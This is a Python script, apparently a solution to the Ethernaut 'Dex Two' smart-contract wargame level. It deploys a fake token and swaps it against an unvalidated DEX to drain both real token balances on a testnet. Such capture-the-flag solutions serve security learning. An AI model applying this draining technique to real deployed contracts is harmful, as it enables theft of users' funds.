from ape import accounts, project
from .utils.helper import get_level_instance, level_completed


ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xF0751022c3765f9bCa97b88bF0986BFCAEbC5D9A"
MAX_UINT = 2**256 - 1


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user, gas=9000000)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.DexTwo.deploy("JayToken", "Jay", 1000000, instance, sender=user)

    contract = project.Dex.at(instance)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    # get token addresses
    token1 = contract.token1()
    token2 = contract.token2()

    # approve instance from spend our tokens
    contract.approve(instance, MAX_UINT, sender=user)

    # approve instance to spend fake tokens
    hacker.approve(instance, MAX_UINT, sender=user)

    # add liquidity to instance
    hacker.transfer(instance, 100, sender=user)

    assert contract.balanceOf(hacker.address, instance) == 100, "liq !added"

    # swap our fake tokens with all of token1 and token2
    contract.swap(hacker.address, token1, 100, sender=user)

    assert contract.balanceOf(token1, instance) == 0, "token1 !0"

    contract.swap(hacker.address, token2, 200, sender=user)

    assert contract.balanceOf(token2, instance) == 0, "token2 !0"

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
